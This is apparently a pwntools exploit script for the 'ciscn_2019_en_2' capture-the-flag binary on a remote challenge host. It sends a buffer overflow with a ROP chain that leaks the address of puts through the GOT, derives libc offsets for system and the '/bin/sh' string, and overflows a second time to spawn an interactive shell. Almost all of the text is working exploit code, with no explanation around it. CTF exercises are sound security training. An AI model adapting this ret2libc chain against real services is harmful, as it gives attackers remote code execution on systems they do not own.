...
target: str = './ciscn_2019_en_2'
target_host = ('redirect.do-not-trust.hacking.run', 10199)
...
rdi_ret = 0x0400c83
ret=0x4006b9
payload = b'\0' + b'A' * (48+32+8-1) 
payload += (p64(rdi_ret) + p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main))
sl('1')
sl(payload)
ru('iphertex')
rl()
rl()
addr_leak = u64(rl().strip().ljust(8, b'\0'))
print('addr_leak', hex(addr_leak))
# # from : https://libc.blukat.me/?q=puts%3Aaa0&l=libc6_2.27-3ubuntu1.4_amd64
# r.interactive()


libc_addr_system = 0x04f550 # from libc-database
libc_binsh = 0x1b3e1a
libc_puts = 0x080aa0
offset = addr_leak - libc_puts # offset = leak - libc
binsh_addr = libc_binsh + offset
system_addr = libc_addr_system + offset

payload = b'\0' + b'A' * (48+32+8-1) 
payload += (p64(rdi_ret) + p64(binsh_addr) + p64(ret) +p64(system_addr)+p64(main))
sl('1')
sl(payload)
r.interactive()
sys.exit(0)
